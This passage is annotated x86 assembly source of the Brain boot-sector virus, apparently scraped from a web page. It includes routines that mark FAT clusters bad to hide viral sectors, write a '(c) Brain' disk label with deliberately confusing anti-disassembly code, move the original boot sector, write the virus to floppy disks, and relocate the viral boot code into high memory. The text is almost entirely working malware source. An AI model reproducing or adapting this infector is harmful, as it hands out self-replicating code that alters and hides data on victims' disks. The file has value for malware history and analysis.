                CMP     AX,0000H                ;if 0, that cluster is empty
                JNE     NOT_EMPTY               ;if not empty, reset CLUSTER_CNT
                INC     [CLUSTER_CNT]           ;else increment it
                CMP     [CLUSTER_CNT],3         ;do we have 3 consecutive
                JNE     FIND_ANOTHER            ;clusters free? jump if not
                JMP     SHORT SPACE_FOUND       ;else this is where the virus
                NOP                             ;will go, go mark off the space

NOT_EMPTY:      MOV     [CLUSTER_CNT],0         ;last one wasn't empty

FIND_ANOTHER:   INC     CX                      ;look at next cluster
                CMP     CX,0163H                ;make sure we're not at end
                JNE     CLUST_LOOP              ;of disk, and check next cluster
                MOV     AL,1                    ;at end of disk, set al=1
                STC                             ;set carry to indicate error
                RETN                            ;and exit

;Found space on disk for virus, mark those clusters bad now
SPACE_FOUND:    MOV     DL,3                    ;counter for clusters to mark
SF_LOOP:        CALL    WRITE_BAD_FAT           ;mark cluster number cx bad
                DEC     CX                      ;back up one cluster
                DEC     DL                      ;decrement cluster counter
                JNE     SF_LOOP                 ;loop until counter 0
                INC     CX                      ;cx points to first bad cluster
                CALL    COMP_HD_TRK_SEC         ;turn cx into cyl/hd/sec data
                CALL    WRITE_FAT               ;write both FATs back to disk
                MOV     AL,0                    ;set al=0 to indicate success
                CLC                             ;clear carry
                RETN                            ;and exit
MODIFY_FAT      ENDP


;******************************************************************************
;This routine is passed a FAT entry number in cx, and it puts a bad cluster
;marker (FF7 Hex) into that entry slot in both FATs in memory, stored at
;DISK_BUFFER and DISK_BUFFER+400H.

WRITE_BAD_FAT   PROC    NEAR
                PUSH    CX                      ;save cx and dx
                PUSH    DX
                MOV     SI,OFFSET DISK_BUFFER   ;DISK_BUFFER where FAT is
                MOV     AL,CL                   ;See if entry # is even or odd
                SHR     AL,1
                JB      WR_ODD                  ;go handle odd FAT entry number
                CALL    GET_FAT_OFFSET          ;even, get offset of entry
                MOV     AX,WORD PTR [BX+SI]     ;read existing value
                AND     AX,0F000H               ;mask lower entry
                OR      AX,0FF7H                ;set lower entry to bad sector
                JMP     SHORT WBF_DONE          ;all done with even
                NOP

WR_ODD:         CALL    GET_FAT_OFFSET          ;odd, get offset of entry
                MOV     AX,WORD PTR [BX+SI]     ;read existing value
                AND     AX,000FH                ;mask high entry
                OR      AX,0FF70H               ;set high entry to bad sector

WBF_DONE:       MOV     [BX+SI],AX              ;write entry back to FAT in RAM
                MOV     [BX+SI+400H],AX         ;and write it to 2nd FAT also!
                POP     DX                      ;restore DX and CX
                POP     CX
                RETN

WRITE_BAD_FAT   ENDP


;******************************************************************************
;This procedure reads the FAT entry number requested in cx and puts the result
;in ax.

READ_FAT_ENTRY  PROC    NEAR
                PUSH    CX                      ;save FAT entry number
                MOV     SI,OFFSET DISK_BUFFER   ;FAT is stored here
                MOV     AL,CL                   ;See if AL is odd or even
                SHR     AL,1                    ;put parity bit in c
                JB      DO_ODD                  ;and go handle the odd case
                CALL    GET_FAT_OFFSET          ;handle even / get proper offset
                MOV     AX,WORD PTR [BX+SI]     ;read entry into ax
                AND     AX,0FFFH                ;and mask lower entry off
                JMP     SHORT RF_EXIT           ;all done
                NOP

DO_ODD:         CALL    GET_FAT_OFFSET          ;odd entry #, get offset
                MOV     AX,WORD PTR [BX+SI]     ;read entry into table
                AND     AX,0FFF0H               ;mask upper entry off
                MOV     CL,4                    ;and shift it down 4 bits
                SHR     AX,CL

RF_EXIT:        POP     CX                      ;restore cx
                RETN                            ;Return with ax=FAT entry

READ_FAT_ENTRY  ENDP


;******************************************************************************
;Find the offset of the FAT entry (in bytes) in the FAT table, which is stored
;in RAM. The FAT entry number is passed to this procedure in cx, and the offset
;is returned in bx. Each FAT entry takes up 12 bits on a 360K disk, so this
;procedure essentially has to multiply the entry number by 1.5.

GET_FAT_OFFSET  PROC    NEAR
                PUSH    DX                      ;preserve dx here
                MOV     AX,3                    ;multiply cx by 3
                MUL     CX
                SHR     AX,1                    ;and divide by 2
                MOV     BX,AX                   ;put result in bx
                POP     DX
                RETN

GET_FAT_OFFSET  ENDP


;******************************************************************************
;This reads both FAT tables from a 360K disk into the buffer DISK_BUFFER.

READ_FAT        PROC    NEAR
                MOV     AH,2                    ;set up read function
                CALL    RD_WRT_FAT              ;go perform the operation
                RETN

READ_FAT        ENDP


;******************************************************************************
;This writes both FAT tables to a 360K disk from the DISK_BUFFER.

WRITE_FAT       PROC    NEAR
                MOV     AH,3                    ;set up write function
                CALL    RD_WRT_FAT              ;go perform the operation
                RETN

WRITE_FAT       ENDP


;******************************************************************************
;This procedure actually performs the read or write function to read or
;write the FAT from/to a 360 K disk. The disk command is passed to this
;procedure in ah.

RD_WRT_FAT      PROC    NEAR
                MOV     CX,4                    ;retry counter = 4
DSK_LP:         PUSH    CX                      ;save it
                PUSH    AX                      ;preserve ax too
                MOV     AH,00                   ;reset the disk first
                INT     6DH
                POP     AX
                JB      DSK_BAD                 ;jump if reset fails
                MOV     BX,OFFSET DISK_BUFFER
                MOV     AL,4                    ;read/write 4 sectors
                MOV     DH,0                    ;at cyl 0, hd 0, sec 2
                MOV     DL,[DRIVE_NO]
                MOV     CX,2
                PUSH    AX                      ;save ax
                INT     6DH                     ;go do it
                POP     AX
                JNB     RWFAT_OK                ;exit if successful
DSK_BAD:        POP     CX                      ;else retry
                LOOP    DSK_LP                  ;if counter not zero
                POP     AX                      ;these pops look like a bug!
                POP     AX
                MOV     AL,2                    ;set carry and al=2
                STC                             ;as an indicator of failure
                RETN                            ;and return

RWFAT_OK:       POP     CX                      ;clear stack and return
                RETN                            ;with c reset on success

RD_WRT_FAT      ENDP


;******************************************************************************
;This routine computes cyl, hd, and sec numbers from a cluster number passed in
;cx. It is used to determine where to do writes using BIOS, based on the
;cluster numbers gathered from the FAT when marking out a bad area. The cyl,
;hd, sec info is stored in INF_CYL, INF_HEAD and INF_SECTOR.

COMP_HD_TRK_SEC PROC    NEAR
                PUSH    CX                      ;cluster number in cx
                SUB     CX,2
                SHL     CX,1                    ;
                ADD     CX,0CH                  ;cx = absolute sector number now
                MOV     AX,CX
                MOV     CL,12H                  ;cl = 18, sectors per cylinder
                DIV     CL                      ;al = trk, ah= sec in cylinder
                MOV     BYTE PTR DS:INF_CYL,AL  ;cyl of 1st sector in cluster
                MOV     BYTE PTR DS:INF_HEAD,00 ;assume head is 0
                INC     AH                      ;sector number goes 1 to 18
                CMP     AH,9                    ;is it greater than 9?
                JNA     CHTS_1                  ;no, so head is 0, sec # is ok
                SUB     AH,9                    ;else subtract 9 sectors
                MOV     BYTE PTR DS:INF_HEAD,01 ;and set head = 1
CHTS_1:         MOV     BYTE PTR DS:INF_SECTOR,AH;save sector number here
                POP     CX                      ;restore cluster number
                RETN                            ;and exit

COMP_HD_TRK_SEC ENDP

;-----------------------------------------------------
                DB      6D DUP (0)

DISK_FCTN       DB      3
DIR_ENTRIES     DW      5BH
TEMP_W1         DW      303H
TEMP_W2         DW      0EBE
TEMP_W3         DW      1
TEMP_W4         DW      100H


                DB      0E0H,0D8H,9DH,0D7H
                DB      0E0H,09FH,8DH,98H,09FH,8EH
                DB      0E0H
                DB      ' (c) ashar $'


;******************************************************************************
;This procedure puts the '(C)Brain' label in the root directory to notify the
;user that that diskette has been infected by the brain virus.

PUT_LABEL       PROC    NEAR
                CALL    READ_ROOT_DIR           ;read root directory from disk
                JB      PL_ERR                  ;exit on error
                PUSH    DI                      ;preserve di
                CALL    WRITE_LABEL             ;write the label in memory
                POP     DI
                JB      PL_ERR                  ;exit on error
                CALL    WRITE_ROOT_DIR          ;and write memory image to disk
PL_ERR:         RETN


PUT_LABEL       ENDP

                DB      0BBH,9BH,04,0B9H,0BH,00 ;random unused bytes here
                DB      8AH,07,0F6H,0D8H,88H,04
                DB      46H,43H,0E2H,0F6H,0B0H,08
                DB      88H,04,0F8H,0C3H,0C6H,06


;******************************************************************************
;This procedure modifies the image of the root directory in memory to put the
;label '(C) Brain' in one directory entry. The label will be inserted in the
;first open entry, or it will overwrite the existing label, if there is one.
;This is an incredibly tricky procedure. It makes an attempt to fool anyone who
;tries to disassemble it, and confuse the heck out of them, using already
;executed instructions for data, etc. It is fully documented in the
;accompanying text.

WRITE_LABEL     PROC    NEAR
                MOV     DIR_ENTRIES,6CH         ;number of dir entries available
                MOV     SI,OFFSET DISK_BUFFER+40H ;assume DOS files are there
                MOV     TEMP_W1,DX              ;save dx
                MOV     AX,DIR_ENTRIES
                SHR     AX,1
                MOV     TEMP_W3,AX              ;TEMP_W3 = 36H
                SHR     AX,1
                MOV     TEMP_W2,AX              ;TEMP_W2 = 1BH   * needlessly
                XCHG    AX,CX
                AND     CL,43H                  ;CL = 3          * confusing
                MOV     DI,TEMP_W2
                ADD     DI,01E3H                ;DI = 1FE Hex    * code

DS_LOOP:        MOV     AL,BYTE PTR [SI]        ;check a directory entry
                CMP     AL,0                    ;is it empty?
                JE      USE_DIR_ENTRY           ;yes, use it for label
                MOV     AL,BYTE PTR [SI+0BH]    ;else check attribute
                AND     AL,8                    ;is it a label?
                CMP     AL,8
                JE      USE_DIR_ENTRY           ;if a label, go change it
                ADD     SI,20H                  ;else go to next dir entry
                DEC     DIR_ENTRIES             ;decrement counter
                JNE     DS_LOOP                 ;and loop until all checked
                STC                             ;if no room for label set carry
                RETN                            ;and return


                DB      8BH                     ;more confusion


USE_DIR_ENTRY:  MOV     BX,WORD PTR [DI]        ;BX=ds:[1FE]=
                XOR     BX,TEMP_W3              ;BX=36H
                MOV     TEMP_W3,SI              ;TEMP_W3 = ptr to dir entry
                CLI                             ;turn OFF Interrupts
                MOV     AX,SS
                MOV     TEMP_W1,AX              ;save ss here
                MOV     TEMP_W2,SP              ;and sp here
                MOV     AX,CS
                MOV     SS,AX                   ;ss=cs
                MOV     SP,TEMP_W3              ;sp = dir entry
                ADD     SP,0CH                  ;at end of name

                MOV     CL,51H                  ;here is where the fun starts
                ADD     DX,444CH                ; none of this code
                MOV     DI,2555H                ;really does anything
                MOV     CX,0C03H                ;except act as data for
                REPZ    CMPSW                   ;what follows
                MOV     AX,0B46H
                MOV     CX,0003H
                ROL     AX,CL                   ;AX=5A30H
                MOV     TEMP_W3,AX              ;put it here

                MOV     CX,5                    ;OK, real code, loop counter = 5
                MOV     DX,0008H                ;nonsense
                SUB     TEMP_W3,5210H           ;adjust TEMP_W3 to 0820H
                PUSH    TEMP_W3                 ;use to set attribute, last byte

;LP1 and LP2 decode the above nonsense code. BX is set to the start of the
;dual purpose code upon entry here.
LP1:            MOV     AH,BYTE PTR [BX]        ;get a byte from the code
                INC     BX                      ;move pointer up
                MOV     DL,AH                   ;this one goes in ah
                SHL     DL,1                    ;is byte greater than 7FH?
                JB      LP1                     ;yes, go get another

LP2:            MOV     DL,BYTE PTR [BX]        ;else get another byte
                INC     BX                      ;move pointer up
                MOV     AL,DL                   ;this one goes in al
                SHL     DL,1                    ;is byte greater than 7FH?
                JB      LP2                     ;yes, go get another

                ADD     AX,1D1DH                ;word in ax, add 1D1D to it
                PUSH    AX                      ;and use this byte to make label
                INC     WORD PTR TEMP_W3        ;no apparent purpose

                JNB     LP3                     ;this always jumps

                DB      0EA                     ;nonsense


LP3:            LOOP    LP1                     ;loop 5 times
                MOV     SP,WORD PTR DS:TEMP_W2  ;restore sp
                MOV     AX,WORD PTR DS:TEMP_W1  ;and ss
                MOV     SS,AX
                STI                             ;turn ON Interrupts
                ADD     DH,BYTE PTR [BP+SI]     ;more nonsense
                CLC                             ;clear c to indicate success
                RETN                            ;and exit
WRITE_LABEL     ENDP


;******************************************************************************
;This procedure reads the entire root directory of a 360K floppy disk into
;memory at the location DISK_BUFFER.

READ_ROOT_DIR   PROC    NEAR
                MOV     [DISK_FCTN],2           ;set up for a read
                JMP     SHORT ROOT_RW           ;and go do it in procedure below
                NOP
READ_ROOT_DIR   ENDP


;******************************************************************************
;This procedure writes the entire root directory of a 360K floppy disk from
;memory at the location DISK_BUFFER.

WRITE_ROOT_DIR  PROC    NEAR
                MOV     [DISK_FCTN],3           ;set up for a write
                JMP     SHORT ROOT_RW           ;and go do it
                NOP
WRITE_ROOT_DIR  ENDP


;******************************************************************************
;This procedrue performs the actual mechanics of reading/writing the root
;directory on a 360K floppy disk. It is called only from READ_ROOT_DIR and
;WRITE_ROOT_DIR above.

ROOT_RW         PROC    NEAR
                MOV     DH,0                    ;read/write cyl 0, hd 0, sec 6
                MOV     DL,[DRIVE_NO]
                MOV     CX,0006H
                MOV     AH,[DISK_FCTN]
                MOV     AL,04                   ;read/write 4 sectors
                MOV     BX,OFFSET DISK_BUFFER   ;to/from here
                CALL    DISK_OPERATION          ;go do it
                JB      RRW_ERR                 ;exit on error
                MOV     CX,1                    ;next rd/wrt cyl 0, hd 1, sec 1
                MOV     DH,1
                MOV     AH,[DISK_FCTN]
                MOV     AL,3                    ;read/write 3 more sectors
                ADD     BX,800H                 ;move buffer ptr up
                CALL    DISK_OPERATION
RRW_ERR:        RETN

ROOT_RW         ENDP


;******************************************************************************
;This routine just performs a disk interrupt, with the added niceties of
;doing a disk reset before performing the requested operation, and allowing
;for up to 4 retries in the event that the interrupt is not successful. AX,
;BX,CX,DX and ES are set up just as they would be in doing a direct Int 13H
;when this routine is called.

DISK_OPERATION  PROC    NEAR
                MOV     [TEMP_W1],AX            ;save ax,bx,cx & dx
                MOV     [TEMP_W2],BX
                MOV     [TEMP_W3],CX
                MOV     [TEMP_W4],DX
                MOV     CX,4                    ;retry counter = 4
DO_LOOP:        PUSH    CX
                MOV     AH,0                    ;reset disk first
                INT     6DH
                JB      DSK_FAIL                ;jump if reset failed
                MOV     AX,[TEMP_W1]            ;restore ax,bx,cx & dx
                MOV     BX,[TEMP_W2]
                MOV     CX,[TEMP_W3]
                MOV     DX,[TEMP_W4]
                INT     6DH                     ;and perform requested disk op
                JNB     DSK_OK                  ;jump if it was successful
DSK_FAIL:       POP     CX                      ;else retry up to 4 times
                LOOP    DO_LOOP
                STC                             ;if retry cnt expired, set c
                RETN                            ;and exit

DSK_OK:         POP     CX                      ;clean stack on success
                RETN                            ;and return with c clear

DISK_OPERATION  ENDP


                DB      00,00,00                ;Unnecessary bytes


;******************************************************************************
;The following routine moves the original boot sector on the disk to the first
;sector in the hidden area. Next, it moves five sectors from RAM onto the
;disk, right after the boot sector. Finally, it moves the viral boot sector
;from RAM into the boot sector position at Cylinder 0, Head 0, Track 1. It
;assumes that the location to put the virus in has already been found and
;placed in the INF_SECTOR/INF_HEAD variables. This routine returns with
;c set if it fails.

TEMP1           DW      3                        ;Temporary storage
DISK_OP         DW      301H                     ;Used by DISK_READ & DISK_WRITE
                                                 ;to indicate rd/wrt operation

INFECT_DISK     PROC    NEAR
                CALL    MODIFY_FAT               ;modify FAT table to hide virus
                JB      INF_EXIT                 ;exit on error
                MOV     WORD PTR DS:CURR_SECCYL,1
                MOV     BYTE PTR DS:CURR_HEAD,0  ;read the real boot sector
                MOV     BX,OFFSET DISK_BUFFER    ;into this buffer
                CALL    DISK_READ
                MOV     BX,OFFSET DISK_BUFFER
                MOV     AX,WORD PTR DS:INF_SECTOR
                MOV     WORD PTR DS:CURR_SECCYL,AX
                MOV     AH,BYTE PTR DS:INF_HEAD
                MOV     BYTE PTR DS:CURR_HEAD,AH ;and hide it in first sector of
                CALL    DISK_WRITE               ;hidden area on disk
                CALL    NEXT_SECTOR              ;move pointers to next sector
                MOV     CX,5                     ;sectors to write counter
                MOV     BX,0200H                 ;set buffer pointer=this code
INF_WRITE_LP:   MOV     [TEMP1],CX               ;save sector count here
                CALL    DISK_WRITE               ;write a sector to disk
                CALL    NEXT_SECTOR              ;move pointers to next sector
                ADD     BX,0200H                 ;increment buffer pointer
                MOV     CX,[TEMP1]               ;restore sector count
                LOOP    INF_WRITE_LP             ;loop until done
                MOV     BYTE PTR DS:CURR_HEAD,0
                MOV     WORD PTR DS:CURR_SECCYL,1
                MOV     BX,0                     ;Now put virus' boot sector
                CALL    DISK_WRITE               ;at cyl 0, hd 0, trk 1
                CLC                              ;clear c to indicate success
INF_EXIT:       RETN                             ;and exit

INFECT_DISK     ENDP


;******************************************************************************
;This procedure reads one sector into memory at es:bx using CURR_HEAD and
;CURR_SECCYL for the cylinder/head/sector numbers. It sets c upon return if
;the read operation fails.

DISK_READ       PROC    NEAR
                MOV     [DISK_OP],201H          ;instruction to read 1 sector
                JMP     SHORT DO_DISK           ;go execute operation
                NOP

DISK_READ       ENDP


;******************************************************************************
;This procedure writes one sector from memory at es:bx using CURR_HEAD and
;CURR_SECCYL for the cylinder/head/sector numbers. It sets c upon return if
;the write operation fails.
DISK_WRITE      PROC    NEAR
                MOV     [DISK_OP],301H ;        ;instruction to write 1 sector
                JMP     SHORT DO_DISK           ;go execute operation
                NOP

DISK_WRITE      ENDP


;******************************************************************************
;This works in conjunction with DISK_READ and DISK_WRITE above. It simply
;performs the requested disk operation, and attempts to complete it up to
;four times before giving up. If successful, it returns nc, else it returns
;with c set.

DO_DISK         PROC    NEAR
                PUSH    BX                      ;save buffer address
                MOV     CX,0004H                ;retry count
DD_LOOP:        PUSH    CX
                MOV     DH,BYTE PTR DS:CURR_HEAD
                MOV     DL,BYTE PTR DS:DRIVE_NO ;load current disk parameters
                MOV     CX,WORD PTR DS:CURR_SECCYL
                MOV     AX,[DISK_OP]            ;and the operation to perform
                INT     6DH                     ;and execute
                JNB     DD_OK                   ;jump if successful
                MOV     AH,0                    ;else attempt disk reset
                INT     6DH
                POP     CX                      ;and go through loop again
                LOOP    DD_LOOP
                POP     BX                      ;if loop expired, clean up
                POP     BX                      ;second pop here looks like bug
                STC                             ;set carry flag
                RETN                            ;and get out

DD_OK:          POP     CX                      ;disk operation successful
                POP     BX                      ;so clean up
                RETN                            ;and return with c clear

DO_DISK         ENDP


;******************************************************************************
;This procedure increments the memory variables CURR_SECCYL and CURR_HEAD
;to point to the next sector on a 360K disk. Upon entry, they contain a valid
;cylinder, head and sector number.
NEXT_SECTOR     PROC    NEAR
                INC     BYTE PTR DS:CURR_SECCYL     ;increment sector counter
                CMP     BYTE PTR DS:CURR_SECCYL,0AH ;is it 10 yet?
                JNE     NS_DONE                     ;no, all done
                MOV     BYTE PTR DS:CURR_SECCYL,1   ;yes, set it to 1
                INC     BYTE PTR DS:CURR_HEAD       ;and increment head counter
                CMP     BYTE PTR DS:CURR_HEAD,2     ;is head 2 yet?
                JNE     NS_DONE                     ;no, all done
                MOV     BYTE PTR DS:CURR_HEAD,0     ;yes, set it to 0
                INC     BYTE PTR DS:CURR_SECCYL+1   ;And increment cylinder ctr
NS_DONE:        RETN

NEXT_SECTOR     ENDP

;-----------------------------------------------------
                DB      64,74,61                ;dta


;******************************************************************************

DISK_BUFFER     DW      1CEBH,4990H             ;buffer for reading disk

RBRAIN_ID       DW      4D42H                   ;RAM BRAIN boot sector ID
RSTART_HEAD     DB      20H                     ;RAM based drive head
RSTART_SECCYL   DW      3420H                   ;sector and cylinder

                DB      2E,30,00,02,02       ;4.0...


;******************************************************************************
;This is the start of the BRAIN boot sector.
                ORG     7C00H


MEM_SIZE        EQU     413H


BRAIN           PROC NEAR
                CLI                             ;Turn OFF Interrupts
                JMP     NEAR PTR START

;-----------------------------------------------------

BRAIN_ID        DW      1234H
START_HEAD      DB      0
START_SECCYL    DB      7,0DH
HEAD_NO         DB      0
SECTOR_NO       DB      1
CYL_NO          DB      0
                DB      0,0,0,0

                DB      'Welcome to the  Dungeon         (c) 1986 Brain'
                DB      17H
                DB      '& Amjads (pvt) Ltd   VIRUS_SHOE  RECORD   '
                DB      'v9.0   Dedicated to the dynamic memories of millions '
                DB      'of virus who are no longer with us today - Thanks '
                DB      'GOODNESS!!       BEWARE OF THE er..VIRUS  : '
                DB      '\this program is catching      program '
                DB      'follows after these messeges..... $#@%$@!! '

;-----------------------------------------------------
START:          MOV     AX,CS                   ;*
                MOV     DS,AX
                MOV     SS,AX                   ;ss=ds=cs=0
                MOV     SP,0F000H               ;set up stack
                STI                             ;Turn ON Interrupts
                MOV     AL,[START_HEAD]         ;starting head number for read
                MOV     [HEAD_NO],AL
                MOV     CX,WORD PTR [START_SECCYL]
                MOV     WORD PTR [SECTOR_NO],CX
                CALL    NXT_SECTOR              ;set params for next disk sector
                MOV     CX,5                    ;Virus has 5 more sectors
                MOV     BX,7E00H                ;Load remainder of virus here
LOAD_VIRUS:     CALL    READ_DISK               ;Read a sector from disk
                CALL    NXT_SECTOR              ;set params for next disk sector
                ADD     BX,200H                 ;move buffer for next sector
                LOOP    LOAD_VIRUS              ;Dec CX;Loop if CX>0
                nop
                MOV     AX,WORD PTR DS:[MEM_SIZE]  ;Size of memory in kilobytes
                nop
                SUB     AX,7                    ;Decrement it by 7
                nop
                MOV     WORD PTR DS:[MEM_SIZE],AX
                nop
                MOV     CL,6
                nop
                SHL     AX,CL                   ;Convert resultant into seg @
                MOV     ES,AX                   ;And set es up with that segment
                MOV     SI,7C00H                ;Move this sector and the rest
                MOV     DI,0                    ;Up to high memory
                MOV     CX,1004H
                CLD                             ;Forward String Opers
                REP     MOVSB                   ;Mov DS:[SI]->ES:[DI]
                PUSH    ES                      ;Prepare for control transfer
                MOV     AX,200H                 ;to offset 200 (first of the
                PUSH    AX                      ;hidden sectors)
                RETF                            ;Go to high memory

BRAIN           ENDP

;Read a sector from disk. This preserves bx and cx
READ_DISK       PROC NEAR
                PUSH    CX
                PUSH    BX
                MOV     CX,4                    ;Retry count
READ_LOOP:      PUSH    CX
                MOV     DH,[HEAD_NO]
                MOV     DL,00
                MOV     CX,WORD PTR [SECTOR_NO]
                MOV     AX,0201H
                INT     13H                     ;read sector, into ES:BX
                JNB     READ_IS_OK              ;No error, so continue
                MOV     AH,00                   ;Attempt to reset if an error
                INT     13H                     ;DSK:00-reset, DL=drive
                POP     CX
                LOOP    READ_LOOP               ;Dec CX;Loop if CX>0
                INT     18H                     ;Startup ROM Basic if retries expired
READ_IS_OK:     POP     CX
                POP     BX
                POP     CX
                RETN
READ_DISK       ENDP

;Set params for next disk sector read
NXT_SECTOR      PROC NEAR
                MOV     AL,[SECTOR_NO]          ;increment sector number
                INC     AL
                MOV     [SECTOR_NO],AL
                CMP     AL,0AH                  ;is sector=10?
                JNE     NSDONE                  ;if not, all done
                MOV     [SECTOR_NO],1           ;yes, set sector=1 now
                MOV     AL,[HEAD_NO]            ;increment head count
                INC     AL
                MOV     [HEAD_NO],AL
                CMP     AL,2                    ;is it 2 yet?
                JNE     NSDONE                  ;if not, all done
                MOV     [HEAD_NO],0             ;yes, set head = 0
                INC     [CYL_NO]                ;and increment cylinder number
NSDONE:         RETN
NXT_SECTOR      ENDP

;-----------------------------------------------------

                DB      0E3H
                DB      23H,4DH,59H,0F4H,0A1H,82H
                DB      0BCH,0C3H,12H,0,7EH,12H
                DB      0CDH,21H,0A2H,3CH,5FH,0CH,5


                END     COM_START



</textarea></td></tr></table></body></html>
